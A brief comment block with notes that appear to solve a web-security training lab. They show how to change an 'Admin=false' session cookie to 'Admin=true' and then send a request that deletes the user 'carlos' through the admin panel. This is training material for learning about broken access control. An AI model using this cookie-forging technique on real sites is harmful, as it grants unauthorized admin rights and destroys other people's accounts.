/*

Cookie: session=kTlylyvI4R2DgWU9BHkQ7mUkujXinUDK           //normal loggedout sessioncookie
Cookie: session=hn48VGB95BYbJNoriRa6q9GpmSnJFfnP; Admin=false      //wiener's logged in cookie

go to /admin and modify the cookie
Cookie: session=hn48VGB95BYbJNoriRa6q9GpmSnJFfnP; Admin=true

do this
GET /admin/delete?username=carlos HTTP/2
Cookie: session=hn48VGB95BYbJNoriRa6q9GpmSnJFfnP; Admin=true



*/